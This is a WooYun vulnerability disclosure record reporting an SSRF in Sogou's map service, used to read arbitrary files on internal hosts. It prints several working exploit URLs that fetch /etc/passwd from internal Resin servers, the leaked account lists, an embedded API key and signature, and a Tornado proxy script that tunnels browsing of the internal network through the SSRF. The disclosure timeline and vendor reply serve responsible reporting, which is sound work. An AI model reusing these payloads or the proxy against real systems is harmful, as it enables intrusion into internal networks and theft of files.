{"id": 74744, "wybug_id": "wooyun-2016-0170411", "wybug_title": "搜狗内网几处任意文件读取", "wybug_corp": "搜狗", "wybug_author": "Forever80s", "wybug_date": "2016-01-16 18:15", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： rt 详细说明：  一个ssrf 扫出来很多内网漏洞，比如任意文件读取，今天翻出来这些东西\n\n\n\n\n\n\n\n\n\nC:\\Python27\\python.exe D:/pyprojects/ssrf_proxy/resindocview.pyHTTPConnectionPool(host='map.sogou.com', port=80): Read timed out. (read timeout=3)HTTPConnectionPool(host='map.sogou.com', port=80): Read timed out. (read timeout=3)HTTPConnectionPool(host='map.sogou.com', port=80): Read timed out. (read timeout=3)sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})****************************************************************************************************http://map.sogou.com/poi/request?url=http://10.13.199.124:8080/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd%23?http://api.dianping.com/v1/review/get_recent_reviews&appkey=725920071&business_id=888114&format=json&sign=1a4448d6983647dfa3c2459941675b9169c9222f&cb=sgs._ihrh2sje0sgs._ihrh2sje0&&sgs._ihrh2sje0({\"response\":<pre>inputFile: /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinavahi-autoipd:x:100:156:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologinodin:x:500:500::/home/odin:/bin/bashnagios:x:101:501:nagios:/var/log/nagios:/bin/shnetmonitor:x:501:502::/home/netmonitor:/bin/bash</pre><a href='index.jsp'>back to demo</a>})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})****************************************************************************************************http://map.sogou.com/poi/request?url=http://10.13.207.45:8080/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd%23?http://api.dianping.com/v1/review/get_recent_reviews&appkey=725920071&business_id=888114&format=json&sign=1a4448d6983647dfa3c2459941675b9169c9222f&cb=sgs._ihrh2sje0sgs._ihrh2sje0&&sgs._ihrh2sje0({\"response\":<pre>inputFile: /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinavahi-autoipd:x:100:156:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologinodin:x:500:500::/home/odin:/bin/bashnagios:x:101:501:nagios:/var/log/nagios:/bin/shnetmonitor:x:501:502::/home/netmonitor:/bin/bashpuppet:x:52:52:Puppet:/var/lib/puppet:/sbin/nologinzookeeper:x:102:159:ZooKeeper:/usr/share/zookeeper:/bin/bashyarn:x:103:160:Hadoop Yarn:/var/lib/hadoop-yarn:/bin/bashmapred:x:104:161:Hadoop MapReduce:/var/lib/hadoop-mapreduce:/bin/bashhdfs:x:105:162:Hadoop HDFS:/var/lib/hadoop-hdfs:/bin/bashhbase:x:106:106:HBase:/usr/lib/hbase:/bin/bashmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash</pre><a href='index.jsp'>back to demo</a>})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})sgs._ihrh2sje0&&sgs._ihrh2sje0({\"error\":1})****************************************************************************************************http://map.sogou.com/poi/request?url=http://10.13.210.135:8080/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd%23?http://api.dianping.com/v1/review/get_recent_reviews&appkey=725920071&business_id=888114&format=json&sign=1a4448d6983647dfa3c2459941675b9169c9222f&cb=sgs._ihrh2sje0sgs._ihrh2sje0&&sgs._ihrh2sje0({\"response\":<pre>inputFile: /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinavahi-autoipd:x:100:156:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinnagios:x:101:501:nagios:/var/log/nagios:/bin/shpuppet:x:52:52:Puppet:/var/lib/puppet:/sbin/nologinfor_monitor:x:502:503::/home/for_monitor:/bin/bashgdm:x:42:42::/var/gdm:/sbin/nologinsamba:x:503:504::/home/samba:/bin/bash</pre><a href='index.jsp'>back to demo</a>})****************************************************************************************************内网还有 ssrfhttp://map.sogou.com/poi/request?url=http://10.12.138.223/index.php?url=http://www.baidu.com/%23?http://api.dianping.com/v1/review/get_recent_reviews&appkey=725920071&business_id=888114&format=json&sign=1a4448d6983647dfa3c2459941675b9169c9222f&cb=sgs._ihrh2sje0#/~cores   漏洞证明：  写个代理可以通过ssrf完美浏览内网\n\n\ndef handle_response(response):            if (response.error and not                    isinstance(response.error, tornado.httpclient.HTTPError)):                self.set_status(500)                self.write('Internal server error:\\n' + str(response.error))            else:                self.set_status(response.code, response.reason)                self._headers = tornado.httputil.HTTPHeaders() # clear tornado default header                                for header, v in response.headers.get_all():                    if header not in ('Content-Length', 'Transfer-Encoding', 'Content-Encoding', 'Connection'):                        self.add_header(header, v) # some header appear multiple times, eg 'Set-Cookie'                                if response.body:                    mybody=response.body                    if \"sgs._ihrh2s\" in response.body:                        mybody=response.body.replace('sgs._ihrh2sje0&&sgs._ihrh2sje0({\"response\":',\"\")                        index=mybody.find(\"<html\")                        if not index==-1:                            mybody=mybody[index:]                        mybody=mybody.replace(\"http://map.sogou.com\",\"\")                        mybody=mybody[0:-2]                        #remove jump                        mybody=mybody.replace(\"window.location.href\",\"window.title\")                        if \"<html\" in mybody:                            print mybody                            try:                                a=mybody                                if \"charset=GBk\".lower() in  mybody.lower():                                     a=a.decode('unicode_escape').encode('gbk')                                else:                                    a=a.decode('unicode_escape').encode('utf8')                                mybody=a                            except:                                pass                    self.set_header('Content-Length', len(mybody))                    self.write(mybody)                    print len(mybody)                    #print 11            self.finish()        body = self.request.body        '''        print self.request.uri        print self.request.method        print self.request.headers        print body        '''                if not body:            body = None        try:            if 'Proxy-Connection' in self.request.headers:                del self.request.headers['Proxy-Connection']                         #fix link            u=self.request.uri            global  lastdomain            print u            if \"http://map.sogou.com/\" in u:                if \"url=\" not in u :                    t=lastdomain.split(\"/\")                    t=t[0:-1]                    t.append(\"\")                    relpath=\"/\".join(t)                    rootpath=\"http://\"+t[2]+\"/\"                    #relative path                    if \"http://map.sogou.com/poi\" in u:                        u=u.replace(\"http://map.sogou.com/poi/\",relpath)                    else:                        u=u.replace(\"http://map.sogou.com/\",rootpath)                    print \"#####\"*10                    u=\"http://map.sogou.com/poi/request?url=\"+\\                                     u+\"?http://api.dianping.com/v1/review/get_recent_reviews&appkey=725920071&business_id=888114&format=json&sign=1a4448d6983647dfa3c2459941675b9169c9222f&cb=sgs._ihrh2sje0\"                    self.request.uri=u                    print \"url=\"+u                else:                    #update lastdomain                    if \"http://map.sogou.com/poi/request?url=\" in u:                        t=u.replace(\"http://map.sogou.com/poi/request?url=\",\"\")                        lastdomain=t.split(\"?\")[0]                        print \"last doamin \"+lastdomain                    else:                        u=\"http://map.sogou.com/poi/request?url=\"+\\                                     u+\"?http://api.dianping.com/v1/review/get_recent_reviews&appkey=725920071&business_id=888114&format=json&sign=1a4448d6983647dfa3c2459941675b9169c9222f&cb=sgs._ihrh2sje0\"                        self.request.uri=u            if \"http://10\" not in self.request.uri:                u=self.request.uri                u=\"http://map.sogou.com/poi/request?url=\"+\\                                     u+\"?http://api.dianping.com/v1/review/get_recent_reviews&appkey=725920071&business_id=888114&format=json&sign=1a4448d6983647dfa3c2459941675b9169c9222f&cb=sgs._ihrh2sje0\"                self.request.uri=u            fetch_request(                self.request.uri, handle_response,                method=self.request.method, body=body,                headers=self.request.headers, follow_redirects=False,                allow_nonstandard_methods=True)            request_dict={}            request_dict['uri']=self.request.uri            request_dict['method']=self.request.method            request_dict['headers']=self.request.headers            request_dict['body']=body            #self.queue.put(request_dict)            #self.isqlmap.extract_request(self.request.uri,self.request.method,self.request.headers,body)            #print request_dict                    except tornado.httpclient.HTTPError as e:            if hasattr(e, 'response') and e.response:                handle_response(e.response)            else:                self.set_status(500)                self.write('Internal server error:\\n' + str(e))                self.finish()\n   修复方案：  rt   版权声明：转载请注明来源 Forever80s@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-01-18 11:26 厂商回复： 感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-16 18:50 |    \t\t進撃のDanny \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:12        | )\t\t \n  内网。。    \n     2016-01-16 23:26 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        还没有发布任何漏洞        | 膜拜学习中)\t\t \n  内网。。    \n     2016-01-18 11:49 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:233 漏洞数:81        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @猪猪侠    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}